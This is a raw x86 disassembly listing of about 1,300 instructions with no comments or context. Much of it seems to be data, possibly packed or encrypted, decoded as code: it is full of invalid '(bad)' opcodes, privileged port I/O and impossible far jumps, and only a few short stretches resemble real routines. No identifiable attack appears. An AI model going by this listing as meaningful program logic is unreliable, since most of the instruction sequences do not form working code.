  4037ad:	out    dx,eax
  4037ae:	fstp   TBYTE PTR [edx-0x14ebf394]
  4037b4:	call   0x1b90615a
  4037b9:	jl     0x4037c9
  4037bb:	call   0x8a55044d
  4037c0:	or     eax,0x8412a35c
  4037c5:	sti    
  4037c6:	mov    dl,BYTE PTR [esi+0x6426916e]
  4037cc:	push   ebx
  4037cd:	sub    al,0xa9
  4037cf:	cmp    BYTE PTR [ebx+ebx*1],0x6
  4037d3:	cs sbb ebp,eax
  4037d6:	sub    eax,esp
  4037d8:	ins    BYTE PTR es:[edi],dx
  4037d9:	mov    al,0xa1
  4037db:	mov    ecx,0x68a8e64f
  4037e0:	pop    ds
  4037e1:	adc    bl,bl
  4037e3:	ret    
  4037e4:	mov    eax,0xc5e209c
  4037e9:	test   al,0x3d
  4037eb:	pop    ebx
  4037ec:	call   0x4b71a9b4
  4037f1:	out    dx,al
  4037f2:	jge    0x403800
  4037f4:	pusha  
  4037f5:	inc    ecx
  4037f6:	mov    ah,0xa3
  4037f8:	pusha  
  4037f9:	pop    ebx
  4037fa:	add    al,0x5b
  4037fc:	mov    al,ds:0x33acecfb
  403801:	sbb    al,0xa4
  403803:	push   es
  403804:	test   al,0x34
  403806:	inc    edx
  403807:	ins    BYTE PTR es:[edi],dx
  403808:	mov    edx,0xe03c603e
  40380d:	fsubr  DWORD PTR [eax+0x2feb4c29]
  403813:	dec    esi
  403814:	xchg   BYTE PTR [ebx+0x6452e5e4],bh
  40381a:	aas    
  40381b:	or     ch,ah
  40381d:	push   edx
  40381e:	in     eax,dx
  40381f:	ins    DWORD PTR es:[edi],dx
  403820:	rol    BYTE PTR [eax+0x17],0x2d
  403824:	push   ds
  403825:	cwde   
  403826:	add    edi,DWORD PTR [ecx+0x1d3760e4]
  40382c:	push   ebx
  40382d:	ins    BYTE PTR es:[edi],dx
  40382e:	or     BYTE PTR [eax+0x5324c91c],cl
  403834:	ins    BYTE PTR es:[edi],dx
  403835:	or     DWORD PTR [ebp+0x8],0x58
  403839:	iret   
  40383a:	adc    dh,BYTE PTR [edi+0x320c2407]
  403840:	enter  0x2020,0x1c
  403844:	sbb    BYTE PTR [edx],dh
  403846:	enter  0x8320,0x14
  40384a:	adc    BYTE PTR [eax+ecx*8],cl
  40384d:	and    BYTE PTR [ebx+0x4080c],al
  403853:	inc    ecx
  403854:	push   es
  403855:	cmp    DWORD PTR [ecx],edi
  403857:	cld    
  403858:	adc    eax,edi
  40385a:	hlt    
  40385b:	push   es
  40385c:	sbb    DWORD PTR [eax+edx*4-0x10],esp
  403860:	in     al,dx
  403861:	call   0x90a4524a
  403866:	inc    ecx
  403867:	loopne 0x403845
  403869:	fmul   st,st(0)
  40386b:	leave  
  40386c:	inc    ecx
  40386d:	push   es
  40386e:	aam    0x40
  403870:	adc    al,BYTE PTR [edx+eiz*1-0x7d]
  403874:	or     al,0x32
  403876:	cmp    al,0x38
  403878:	xor    al,0x81
  40387a:	pop    esp
  40387b:	jb     0x40388d
  40387d:	pop    ss
  40387e:	xor    eax,0x443c7054
  403883:	mov    fs,esp
  403885:	cmp    al,0x54
  403887:	jo     0x40383d
  403889:	lock push es
  40388b:	sbb    esp,esp
  40388d:	jae    0x403865
  40388f:	pop    es
  403890:	icebp  
  403891:	repnz repz sbb DWORD PTR [eax+edx*4+0x41],esp
  403897:	hlt    
  403898:	cmc    
  403899:	mul    BYTE PTR [eax+edx*4+0x41]
  40389d:	push   es
  40389e:	idiv   eax
  4038a0:	stc    
  4038a1:	nop
  4038a2:	inc    ecx
  4038a3:	push   es
  4038a4:	sbb    edx,edi
  4038a6:	sti    
  4038a7:	cld    
  4038a8:	inc    ecx
  4038a9:	push   es
  4038aa:	sbb    DWORD PTR [ebp+edi*8-0x2],esp
  4038ae:	inc    DWORD PTR [esi]
  4038b0:	sbb    DWORD PTR [eax+edx*4-0x20],esp
  4038b4:	loope  0x403898
  4038b6:	jecxz  0x4038d1
  4038b8:	fs nop
  4038ba:	inc    ecx
  4038bb:	in     al,0xe5
  4038bd:	out    0x64,al
  4038bf:	nop
  4038c0:	inc    ecx
  4038c1:	push   es
  4038c2:	out    0xe8,eax
  4038c4:	jmp    0x19467a59
  4038c9:	jmp    0x6419:0x641eceb
  4038d0:	in     eax,dx
  4038d1:	out    dx,al
  4038d2:	out    dx,eax
  4038d3:	push   es
  4038d4:	sbb    DWORD PTR [eax+edx*4-0x30],esp
  4038d8:	rcl    edx,1
  4038da:	rcr    DWORD PTR [ecx],cl
  4038dc:	fs nop
  4038de:	inc    ecx
  4038df:	aam    0xd5
  4038e1:	(bad)  
  4038e2:	fs nop
  4038e4:	inc    ecx
  4038e5:	push   es
  4038e6:	xlat   BYTE PTR ds:[ebx]
  4038e7:	fcomp  st(1)
  4038e9:	nop
  4038ea:	inc    ecx
  4038eb:	push   es
  4038ec:	sbb    edx,ebx
  4038ee:	fcmovnu st,st(4)
  4038f0:	inc    ecx
  4038f1:	push   es
  4038f2:	sbb    DWORD PTR [ebp+ebx*8-0x22],esp
  4038f6:	fild   WORD PTR [esi]
  4038f8:	sbb    DWORD PTR [eax+edx*4-0x40],esp
  4038fc:	rol    edx,0xc3
  4038ff:	sbb    DWORD PTR [eax+edx*4+0x41],esp
  403903:	(bad)  
  403904:	(bad)
  403907:	nop
  403908:	inc    ecx
  403909:	push   es
  40390a:	(bad)  
  40390b:	enter  0x90c9,0x41
  40390f:	push   es
  403910:	sbb    edx,ecx
  403912:	retf   
  403913:	int3   
  403914:	inc    ecx
  403915:	push   es
  403916:	sbb    DWORD PTR [ebp+ecx*8-0x32],esp
  40391a:	iret   
  40391b:	push   es
  40391c:	sbb    DWORD PTR [eax+edx*4-0x50],esp
  403920:	mov    cl,0xb2
  403922:	mov    bl,0x19
  403924:	fs nop
  403926:	inc    ecx
  403927:	mov    ah,0xb5
  403929:	mov    dh,0x64
  40392b:	nop
  40392c:	inc    ecx
  40392d:	push   es
  40392e:	mov    bh,0xb8
  403930:	mov    ecx,0x19064190
  403935:	mov    edx,0x641bcbb
  40393a:	sbb    DWORD PTR [ebp+edi*4-0x42],esp
  40393e:	mov    edi,0x90641906
  403943:	mov    al,ds:0x19a3a2a1
  403948:	fs nop
  40394a:	inc    ecx
  40394b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40394c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40394d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40394e:	xchg   edx,eax
  40394f:	and    DWORD PTR [ecx+0x6],0xffffffa7
  403953:	imul   DWORD PTR ds:0xf247257
  403959:	in     al,0x74
  40395b:	xor    al,0x57
  40395d:	je     0x40397a
  40395f:	fdiv   DWORD PTR [eax]
  403961:	aaa    
  403962:	mov    WORD PTR [edi],ss
  403964:	add    BYTE PTR [ebx],cl
  403966:	adc    ebx,DWORD PTR [esi+0x22]
  403969:	push   0x330c9e0e
  40396e:	or     al,0x10
  403970:	inc    eax
  403971:	rcr    DWORD PTR [ebx],0x3b
  403974:	dec    edx
  403975:	push   cs
  403976:	xor    DWORD PTR [ecx],eax
  403978:	add    al,0x5b
  40397a:	jmp    0x7845:0x969127f
  403981:	arpl   WORD PTR [ebp+0x70],sp
  403984:	je     0x4039ef
  403986:	test   eax,0x334d5bf4
  40398b:	popa   
  40398c:	sub    esp,DWORD PTR [edi-0xc]
  40398f:	adc    BYTE PTR [eax-0x3],al
  403992:	and    BYTE PTR [edi-0x67d3a870],ch
  403998:	inc    ebp
  403999:	dec    eax
  40399a:	gs popa 
  40399c:	jo     0x403931
  40399e:	pop    ss
  40399f:	fst    DWORD PTR [ebx+0x5850905a]
  4039a5:	pop    ebx
  4039a6:	push   eax
  4039a7:	pop    eax
  4039a8:	sar    bh,1
  4039aa:	add    DWORD PTR [eax+0x4f450ca8],edx
  4039b0:	jne    0x403a26
  4039b2:	dec    edi
  4039b3:	dec    bp
  4039b5:	gs ins DWORD PTR es:[edi],dx
  4039b7:	das    
  4039b8:	xchg   esp,eax
  4039b9:	xor    eax,0x9f79e3b0
  4039be:	lods   al,BYTE PTR ds:[esi]
  4039bf:	pop    ebx
  4039c0:	pop    ds
  4039c1:	(bad)  [edi+0x1fb76612]
  4039c7:	or     eax,DWORD PTR [ebp+0x49]
  4039ca:	outs   dx,BYTE PTR ds:[esi]
  4039cb:	pop    ebp
  4039cc:	inc    ebp
  4039cd:	and    BYTE PTR [edi],ch
  4039cf:	mov    dl,0xdb
  4039d1:	jb     0x403a45
  4039d3:	pop    ebx
  4039d4:	add    al,0x59
  4039d6:	push   edi
  4039d7:	add    al,0x59
  4039d9:	add    ch,BYTE PTR [esp+edx*1]
  4039dc:	push   esi
  4039dd:	or     esi,DWORD PTR gs:[edi+ebx*1+0x43]
  4039e2:	fld    DWORD PTR [edx-0x5d]
  4039e5:	test   bh,dl
  4039e7:	pop    esp
  4039e8:	push   edi
  4039e9:	pop    esp
  4039ea:	xchg   edx,eax
  4039eb:	stos   DWORD PTR es:[edi],eax
  4039ec:	in     al,0x20
  4039ee:	mov    eax,0x94321258
  4039f3:	pop    ebp
  4039f4:	inc    edx
  4039f5:	imul   edi,DWORD PTR [edi+ebx*2+0x30c136bc],0x10
  4039fd:	or     DWORD PTR [edi],ecx
  4039ff:	or     eax,0x8bc9e4b7
  403a04:	in     al,dx
  403a05:	adc    al,0x5a
  403a07:	push   edi
  403a08:	adc    al,0x5a
  403a0a:	jo     0x403a65
  403a0c:	sub    cl,bh
  403a0e:	jmp    FWORD PTR [ebx+0x6944450a]
  403a14:	jbe    0x403a58
  403a16:	jns    0x403a72
  403a18:	gs jb  0x403a8a
  403a1b:	nop
  403a1c:	ins    BYTE PTR es:[edi],dx
  403a1d:	cld    
  403a1e:	inc    edx
  403a1f:	and    BYTE PTR [esp+ebp*2-0x41],ah
  403a23:	push   edx
  403a24:	popa   
  403a25:	outs   dx,BYTE PTR ds:[esi]
  403a26:	adc    BYTE PTR gs:[bp+si],dh
  403a2a:	xchg   esp,eax
  403a2b:	(bad)  
  403a2c:	les    edx,FWORD PTR [edi-0x3c]
  403a2f:	push   DWORD PTR ss:[edx+0x23]
  403a33:	jae    0x403a7e
  403a35:	outs   dx,BYTE PTR ds:[esi]
  403a36:	jbe    0x403a9d
  403a38:	jb     0x403aa0
  403a3a:	ins    BYTE PTR es:[edi],dx
  403a3b:	outs   dx,DWORD PTR ds:[esi]
  403a3c:	ja     0x403a5e
  403a3e:	pop    ebx
  403a3f:	push   esi
  403a40:	and    BYTE PTR [edi],ch
  403a42:	adc    ah,BYTE PTR [ebx+0x20]
  403a45:	pop    ebx
  403a46:	in     al,dx
  403a47:	pop    eax
  403a48:	or     DWORD PTR [esi],edx
  403a4a:	or     ecx,DWORD PTR [ebp+0x22]
  403a4d:	mov    dl,0x90
  403a4f:	js     0x403aa8
  403a51:	push   ebp
  403a52:	bnd jnp 0x4039f6
  403a55:	pop    ds
  403a56:	mov    bl,0xd4
  403a58:	pop    edx
  403a59:	sub    bl,bh
  403a5b:	sbb    ecx,ebp
  403a5d:	or     dh,BYTE PTR [esi+0x18]
  403a60:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x8757d090
  403a68:	inc    edx
  403a69:	and    BYTE PTR [eax+edx*8+0x63],ah
  403a6d:	mov    dh,0xbc
  403a6f:	enter  0xcde,0xbf
  403a73:	pop    ecx
  403a74:	sub    BYTE PTR gs:[edi+edx*2+0x28],bl
  403a79:	pop    esp
  403a7a:	xchg   al,dl
  403a7c:	pop    eax
  403a7d:	sub    DWORD PTR [ebx+0x60],0x225650bc
  403a84:	xlat   BYTE PTR ds:[ebx]
  403a85:	push   edi
  403a86:	pop    ds
  403a87:	in     al,dx
  403a88:	fst    DWORD PTR [edi+0x20]
  403a8b:	pop    es
  403a8c:	push   ebp
  403a8d:	outs   dx,BYTE PTR ds:[esi]
  403a8e:	fs pop eax
  403a90:	nop
  403a91:	fcom   DWORD PTR [edi-0x72]
  403a94:	sar    BYTE PTR [edx-0x5f],0x1f
  403a98:	xchg   DWORD PTR [edi],ecx
  403a9a:	enter  0xfd36,0x10
  403a9e:	pop    edi
  403a9f:	push   eax
  403aa0:	outs   dx,DWORD PTR ds:[esi]
  403aa1:	imul   ebp,DWORD PTR [esi-0x7c],0x365b5d34
  403aa8:	add    al,0xd6
  403aaa:	mov    bh,0x1f
  403aac:	or     al,0x2f
  403aae:	or     al,0x5b
  403ab0:	xchg   BYTE PTR [edx+0x61431f8e],dh
  403ab6:	jae    0x403b2c
  403ab8:	outs   dx,DWORD PTR ds:[esi]
  403ab9:	nop
  403aba:	pop    ebx
  403abb:	nop
  403abc:	or     al,0xad
  403abe:	pop    es
  403abf:	inc    edx
  403ac0:	or     eax,0x69254345
  403ac5:	js     0x403a68
  403ac7:	in     al,dx
  403ac8:	nop
  403ac9:	xlat   BYTE PTR ds:[ebx]
  403aca:	in     al,dx
  403acb:	pop    ebx
  403acc:	pop    ds
  403acd:	cmc    
  403ace:	(bad)  
  403acf:	pop    eax
  403ad1:	retf   
  403ad2:	adc    BYTE PTR [ebp+0x41],al
  403ad5:	arpl   WORD PTR [edi-0x76a98c8d],ax
  403adb:	idiv   DWORD PTR fs:[edx-0x729e9378]
  403ae2:	mov    ebx,0x71d5e4c
  403ae7:	inc    edx
  403ae8:	jp     0x403b09
  403aea:	sub    edx,DWORD PTR [eax+0x72]
  403aed:	js     0x403b5b
  403aef:	and    DWORD PTR [ebx-0x27],eax
  403af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af3:	gs jecxz 0x403a86
  403af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403af7:	push   edi
  403af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403af9:	ret    
  403afa:	clc    
  403afb:	or     eax,0x7453af02
  403b00:	popa   
  403b01:	arpl   WORD PTR [ebx-0x80],bp
  403b04:	test   BYTE PTR [eax+ecx*2+0x5f0090e0],bh
  403b0b:	inc    ebx
  403b0c:	add    BYTE PTR [edi+0x2d],bl
  403b0f:	pop    esp
  403b10:	push   0x6a746f18
  403b15:	ins    BYTE PTR es:[edi],dx
  403b16:	inc    ebx
  403b17:	imul   ebx,DWORD PTR [eax+0x15],0x8
  403b1b:	das    
  403b1c:	xchg   esp,eax
  403b1d:	push   edi
  403b1e:	pop    ds
  403b1f:	(bad)  
  403b20:	mov    dl,0x49
  403b22:	pusha  
  403b23:	loope  0x403b7b
  403b25:	popa   
  403b26:	or     al,0x61
  403b28:	lahf   
  403b29:	mov    ah,0x5b
  403b2b:	xor    BYTE PTR [edx+eax*2],al
  403b2e:	xchg   BYTE PTR [edi+eax*8+0x51c1b0d0],dh
  403b35:	les    esp,FWORD PTR [edx]
  403b37:	rol    DWORD PTR [esi+0x61],0x6e
  403b3b:	fs add eax,0xc7db22f2
  403b41:	adc    al,0x60
  403b43:	pop    edi
  403b44:	adc    al,0x60
  403b46:	mov    bl,0xc2
  403b48:	(bad)  
  403b49:	jb     0x403b59
  403b4b:	(bad)  
  403b4c:	fdiv   DWORD PTR [edx+0x72]
  403b4f:	mov    esp,0xd9432112
  403b54:	nop
  403b55:	jo     0x403bb2
  403b57:	jo     0x403b7e
  403b59:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403b5b:	push   es
  403b5c:	stos   DWORD PTR es:[edi],eax
  403b5d:	data16 cmp BYTE PTR [ebx-0x34],bl
  403b61:	xchg   edi,eax
  403b62:	or     BYTE PTR [esp+ecx*1+0x61536fcc],al
  403b69:	hlt    
  403b6a:	mov    ebx,0x6566f901
  403b6f:	arpl   WORD PTR [ecx+0x6c],sp
  403b72:	in     al,0x3f
  403b74:	adc    DWORD PTR [ebx],eax
  403b76:	cs aaa 
  403b78:	xor    al,0x4
  403b7a:	add    eax,0x5620d831
  403b7f:	dec    eax
  403b80:	pop    es
  403b81:	or     BYTE PTR [edx],dh
  403b83:	jbe    0x403b66
  403b85:	mov    dh,0x81
  403b87:	push   ebp
  403b88:	and    ch,BYTE PTR [ebx+esi*2-0x65]
  403b8c:	or     BYTE PTR [ecx+0x23],ah
  403b8f:	cmp    BYTE PTR [edi],cl
  403b91:	cmp    DWORD PTR [eax+0x24993f41],ecx
  403b97:	mov    edi,0xa3118c11
  403b9c:	push   ebx
  403b9d:	ds ret 0xeac1
  403ba1:	adc    BYTE PTR [esi-0x20],ah
  403ba4:	add    BYTE PTR [edi+edi*8-0x9],ch
  403ba8:	repz mov ebx,DWORD PTR [ebp+0x8]
  403bac:	mov    WORD PTR [ecx],ax
  403baf:	add    dl,BYTE PTR [ebx]
  403bb1:	cli    
  403bb2:	cld    
  403bb3:	into   
  403bb4:	adc    BYTE PTR [edi],cl
  403bb6:	inc    eax
  403bb7:	xchg   DWORD PTR [edi],eax
  403bb9:	retf   
  403bba:	mov    dl,0x1
  403bbc:	mov    eax,ds:0x3aa95d44
  403bc1:	loop   0x403bca
  403bc3:	mov    ecx,0x20989487
  403bc8:	add    DWORD PTR [si+0x1],esi
  403bcc:	or     al,0xd0
  403bce:	cli    
  403bcf:	sbb    BYTE PTR [edx-0x30],dl
  403bd2:	sahf   
  403bd3:	gs test BYTE PTR cs:0xeaa181c6,ch
  403bdb:	or     dh,bl
  403bdd:	pop    es
  403bde:	out    0xbf,eax
  403be0:	icebp  
  403be1:	inc    esi
  403be2:	sub    eax,0x8a7f21a4
  403be7:	add    BYTE PTR [edi+eax*2],bh
  403bea:	push   es
  403beb:	cmp    al,0x7a
  403bed:	ja     0x403bf1
  403bef:	jb     0x403bcc
  403bf1:	dec    ebp
  403bf2:	aad    0x2c
  403bf4:	and    BYTE PTR [ebp+0x14ff0288],al
  403bfa:	call   FWORD PTR [edi]
  403bfc:	test   DWORD PTR [ebp+0x75e42de8],ebx
  403c02:	fistp  WORD PTR [ecx-0x45]
  403c05:	dec    edi
  403c06:	push   edx
  403c07:	enter  0xcd2,0x41
  403c0b:	pop    edx
  403c0c:	add    al,0x18
  403c0e:	mov    ds:0x9420846,eax
  403c13:	in     eax,dx
  403c14:	or     DWORD PTR [edi-0x5cdee080],edx
  403c1a:	mov    ecx,eax
  403c1c:	cmp    ecx,edx
  403c1e:	jbe    0x403c6d
  403c20:	cmp    ecx,ecx
  403c22:	or     BYTE PTR fs:[esi-0x1],ch
  403c26:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c28:	je     0x403c32
  403c2a:	movzx  eax,BYTE PTR [esi-0x1]
  403c2e:	add    edx,DWORD PTR [edi-0x1]
  403c31:	mov    cs,WORD PTR ss:0xf0835cf6
  403c38:	jnp    0x403c8a
  403c3a:	pop    es
  403c3b:	das    
  403c3c:	rol    BYTE PTR [eax+0x4c],1
  403c3f:	push   es
  403c40:	pop    ebx
  403c41:	ret    
  403c42:	movnti DWORD PTR [ebp-0x17cf989e],esp
  403c49:	pusha  
  403c4a:	or     al,0x43
  403c4c:	sub    al,0x5b
  403c4e:	xor    ebp,DWORD PTR [edx+0x58c74121]
  403c54:	adc    BYTE PTR [eax],ah
  403c56:	outs   dx,BYTE PTR ds:[esi]
  403c57:	rcl    BYTE PTR [edx+0x40],1
  403c5a:	add    al,0x94
  403c5c:	rcl    bl,0x2f
  403c5f:	jmp    0xc7d1:0x8beaf6d9
  403c66:	int    0xf0
  403c68:	mov    ebx,0xfb7c409a
  403c6d:	inc    DWORD PTR [ecx]
  403c6f:	inc    ebx
  403c70:	cmp    esi,ebx
  403c72:	jl     0x403c7b
  403c74:	cmp    BYTE PTR [edi+ebx*1-0x1],0x20
  403c79:	jbe    0x403c6f
  403c7b:	or     bh,BYTE PTR [ebp+0xa]
  403c7e:	mov    eax,ebp
  403c80:	imul   BYTE PTR [ebp+0x175a8ed9]
  403c86:	dec    esi
  403c87:	adc    al,0x37
  403c89:	clc    
  403c8a:	xor    eax,0x41cb2bce
  403c8f:	stc    
  403c90:	pop    eax
  403c91:	adc    al,ah
  403c93:	mov    cl,0x38
  403c95:	xor    BYTE PTR [eax],ch
  403c97:	dec    ebx
  403c98:	iret   
  403c99:	xor    ebx,DWORD PTR [ecx+0x40]
  403c9c:	sbb    al,0x4c
  403c9e:	ret    
  403c9f:	push   ds
  403ca0:	push   edi
  403ca1:	in     al,dx
  403ca2:	inc    ebp
  403ca3:	mov    edx,0x7fddb986
  403ca8:	aaa    
  403ca9:	(bad)  
  403caa:	ror    DWORD PTR ss:[esi],cl
  403cad:	cmc    
  403cae:	stos   BYTE PTR es:[edi],al
  403caf:	ss adc al,0xcb
  403cb2:	cmp    eax,0x1c05bb5b
  403cb7:	pop    eax
  403cb8:	adc    BYTE PTR [esp+ebx*1+0xd],bh
  403cbc:	cmp    BYTE PTR [eax],bl
  403cbe:	cmova  edi,DWORD PTR [eax-0x9]
  403cc2:	jmp    DWORD PTR [edi]
  403cc4:	jne    0x403cd4
  403cc6:	mov    ebx,0x6374b8cb
  403ccb:	loop   0x403cfd
  403ccd:	push   0xd886e442
  403cd2:	bound  edi,QWORD PTR [edi+0x36ff0e68]
  403cd8:	push   es
  403cd9:	ds mov edx,0xc30e6fd9
  403cdf:	jge    0x403ce0
  403ce1:	inc    esp
  403ce2:	push   ebx
  403ce3:	inc    ebx
  403ce4:	daa    
  403ce5:	or     cl,cl
  403ce7:	jne    0x403d00
  403ce9:	dec    DWORD PTR ds:0x79610bc0
  403cef:	push   cs
  403cf0:	mul    DWORD PTR [edx+0x2db08a53]
  403cf6:	inc    ecx
  403cf7:	dec    esi
  403cf8:	mov    BYTE PTR [esi],al
  403cfa:	ret    
  403cfb:	mov    eax,ds:0xb98a1bf8
  403d00:	mov    edx,DWORD PTR [edx+0x56]
  403d03:	xor    edx,edx
  403d05:	div    ecx
  403d07:	dec    esi
  403d08:	mov    ds:0x7a897d00,eax
  403d0d:	cmp    dl,0x3a
  403d10:	and    edx,eax
  403d12:	pop    es
  403d13:	mov    BYTE PTR [esi],dl
  403d15:	(bad)  
  403d16:	(bad)  
  403d17:	mov    edi,0x9cea82b0
  403d1c:	sub    ecx,esi
  403d1e:	sub    edx,ecx
  403d20:	jbe    0x403d32
  403d22:	add    ecx,edx
  403d24:	mov    al,0x30
  403d26:	sub    esi,edx
  403d28:	jmp    0x403d2d
  403d2a:	mov    BYTE PTR [edx+esi*1],al
  403d2d:	dec    edx
  403d2e:	jne    0x403d2a
  403d30:	loop   0x403d91
  403d32:	sti    
  403d33:	out    dx,eax
  403d34:	xor    eax,0x83e68956
  403d39:	in     al,dx
  403d3a:	adc    BYTE PTR [ecx],dh
  403d3c:	leave  
  403d3d:	push   edx
  403d3e:	aaa    
  403d3f:	dec    esp
  403d40:	je     0x403ccb
  403d42:	repnz pop eax
  403d44:	sub    DWORD PTR [edx],ebp
  403d46:	add    eax,0xf6dd59c
  403d4b:	shr    DWORD PTR [edx],1
  403d4d:	(bad)  
  403d4e:	(bad)  [ebx+0x30]
  403d51:	pop    ecx
  403d52:	pusha  
  403d53:	or     dh,bl
  403d55:	jmp    0x470:0xff22851f
  403d5c:	in     al,0x89
  403d5e:	loopne 0x403d57
  403d60:	aas    
  403d61:	push   0x73
  403d63:	xchg   esp,eax
  403d64:	inc    esi
  403d65:	add    edx,DWORD PTR [edi]
  403d67:	pop    esp
  403d68:	sti    
  403d69:	push   esp
  403d6a:	adc    al,0x6b
  403d6c:	sub    eax,0xd6c685e8
  403d71:	sub    eax,0x530b414e
  403d76:	push   ecx
  403d77:	(bad)  
  403d79:	clc    
  403d7a:	jg     0x403d80
  403d7c:	fnstcw WORD PTR [esp+0x2]
  403d80:	fnstcw WORD PTR [esp]
  403d83:	or     WORD PTR [esi*8+0x82cd90f],0xd089
  403d8d:	mov    ds,WORD PTR [esi+esi*2]
  403d90:	fld1   
  403d92:	inc    esp
  403d93:	daa    
  403d94:	and    DWORD PTR [edx+edi*1-0x9],0x3cf61fed
  403d9c:	push   0x6cdfff04
  403da1:	and    al,0x8
  403da3:	fild   QWORD PTR [eax+ebx*8]
  403da6:	ret    0xc1de
  403da9:	sub    BYTE PTR [edx-0x14812049],0x2
  403db0:	fild   QWORD PTR [eax]
  403db2:	fild   WORD PTR [esi+esi*1]
  403db5:	ror    DWORD PTR [esi-0x27],0xf8
  403db9:	fild   QWORD PTR [esi-0x24]
  403dbc:	stc    
  403dbd:	mov    ch,BYTE PTR [edi+0x5b]
  403dc0:	mov    ds:0x3c30675d,eax
  403dc5:	xlat   BYTE PTR ds:[ebx]
  403dc6:	jg     0x403d9e
  403dc8:	push   es
  403dc9:	push   ss
  403dca:	fcom   st(3)
  403dcc:	fwait
  403dcd:	call   DWORD PTR [esi]
  403dcf:	mov    ah,0xfd
  403dd1:	fnstsw ax
  403dd3:	sahf   
  403dd4:	jae    0x403db7
  403dd6:	fnstenv ds:0xc3dd6b02
  403ddc:	ffree  st(2)
  403dde:	ffree  st(1)
  403de0:	frstor [edx-0x37]
  403de3:	in     eax,0xd9
  403de5:	rcr    BYTE PTR [ecx-0x16],0x29
  403de9:	(bad)  
  403dea:	add    ecx,edx
  403dec:	push   edi
  403ded:	mov    cl,0x8c
  403def:	mov    ebp,0x5020ee93
  403df4:	xchg   ebx,eax
  403df5:	add    dh,al
  403df7:	and    eax,0xe0f1085f
  403dfc:	and    BYTE PTR [esi+0x5d],bl
  403dff:	stos   BYTE PTR es:[edi],al
  403e00:	imul   ecx,DWORD PTR [ebx],0x26
  403e03:	or     bl,0xd7
  403e06:	add    ah,BYTE PTR [eax]
  403e08:	sub    eax,DWORD PTR [ebx]
  403e0a:	stc    
  403e0b:	push   ds
  403e0c:	cmp    al,0x51
  403e0e:	mov    ecx,0x2b74290e
  403e13:	sbb    al,BYTE PTR [edx-0x2b59e4e8]
  403e19:	test   al,0x16
  403e1b:	adc    BYTE PTR [edi-0x40],0x51
  403e1f:	(bad)  
  403e20:	pop    edx
  403e21:	jbe    0x403e8a
  403e23:	mov    WORD PTR [ebx-0x2b63ae5d],ss
  403e29:	sbb    al,0x89
  403e2b:	push   es
  403e2c:	ds sub eax,eax
  403e2f:	icebp  
  403e30:	push   ds
  403e31:	mov    al,ds:0x780a15f
  403e36:	sbb    ecx,DWORD PTR [ebx-0xf]
  403e39:	sub    DWORD PTR [eax+0x292f2837],edx
  403e3f:	fstp   TBYTE PTR [eax+0x7821c446]
  403e45:	setno  BYTE PTR [ebx+0x31]
  403e49:	xlat   BYTE PTR ds:[ebx]
  403e4a:	inc    eax
  403e4b:	scas   al,BYTE PTR es:[edi]
  403e4c:	jae    0x403eb5
  403e4e:	add    al,0xd0
  403e50:	daa    
  403e51:	sbb    DWORD PTR [edx-0x4f4510e3],esi
  403e57:	adc    DWORD PTR gs:[edi-0x5f],eax
  403e5b:	test   BYTE PTR [esi],dh
  403e5d:	test   al,cl
  403e5f:	xor    esp,DWORD PTR [eax]
  403e61:	das    
  403e62:	add    al,0x61
  403e64:	test   al,al
  403e66:	aam    0x65
  403e68:	mov    WORD PTR [edx-0x41],fs
  403e6b:	add    al,0x54
  403e6d:	jb     0x403ed9
  403e6f:	pusha  
  403e70:	mov    esi,0x50f0308
  403e75:	add    bl,bl
  403e77:	inc    edi
  403e78:	stos   BYTE PTR es:[edi],al
  403e79:	xlat   BYTE PTR ds:[ebx]
  403e7a:	popf   
  403e7b:	adc    BYTE PTR [edi-0xba39a9],bh
  403e81:	dec    ecx
  403e82:	repnz lds esp,FWORD PTR [esi-0x97a047e]
  403e89:	jl     0x403eab
  403e8b:	inc    esi
  403e8c:	mov    esp,0x138bc01d
  403e91:	sub    edi,DWORD PTR [eax+0x52c66e5b]
  403e97:	js     0x403e9f
  403e99:	sbb    eax,0x1e06eb01
  403e9e:	loopne 0x403ee4
  403ea0:	mov    ?,esi
  403ea2:	jecxz  0x403e2e
  403ea4:	or     esp,edi
  403ea6:	pop    ss
  403ea7:	pusha  
  403ea8:	mov    DWORD PTR [esi],eax
  403eaa:	and    edi,edi
  403eac:	fimul  DWORD PTR [edx]
  403eae:	(bad)  
  403eaf:	std    
  403eb0:	pop    ss
  403eb1:	inc    eax
  403eb2:	and    DWORD PTR [ecx-0x16],ecx
  403eb5:	gs pusha 
  403eb7:	mov    edx,eax
  403eb9:	test   BYTE PTR [ebp+0x43],bh
  403ebc:	sti    
  403ebd:	das    
  403ebe:	sti    
  403ebf:	adc    ebx,ebx
  403ec1:	ins    DWORD PTR es:[edi],dx
  403ec2:	lock fcomp DWORD PTR ds:0xa6886684
  403ec9:	setne  BYTE PTR [ebx]
  403ecc:	jmp    0x403f17
  403ece:	packssdw mm2,QWORD PTR [ebx+0x34551bdd]
  403ed5:	push   ebp
  403ed6:	push   DWORD PTR [eax]
  403ed8:	or     edx,DWORD PTR es:[ebp-0x3c]
  403edc:	inc    eax
  403edd:	mov    dh,0xed
  403edf:	mov    cl,0x59
  403ee1:	xor    eax,DWORD PTR ds:0x216603c6
  403ee7:	and    al,BYTE PTR [ecx+edx*8-0x7b9bd1aa]
  403eee:	add    esp,DWORD PTR [edi-0x3c653e3e]
  403ef4:	xor    cx,di
  403ef7:	add    DWORD PTR [eax],esi
  403ef9:	or     ebx,DWORD PTR [ebp+0x69]
  403efc:	sub    bl,BYTE PTR [ebx-0x78ced2fe]
  403f02:	icebp  
  403f03:	xor    DWORD PTR [edi+ebp*4],ebp
  403f06:	imul   ebp,DWORD PTR [ebx+0x118b7762],0xb0711594
  403f10:	in     al,0x3b
  403f12:	ret    0x128b
  403f15:	sbb    ebp,ebx
  403f17:	and    al,0x10
  403f19:	test   BYTE PTR [edx+0x633fa5f0],al
  403f1f:	(bad)  
  403f20:	xor    edx,edx
  403f22:	mov    cl,dh
  403f24:	adc    al,0x95
  403f26:	sub    al,0xf1
  403f28:	inc    ecx
  403f29:	pop    edi
  403f2a:	ret    
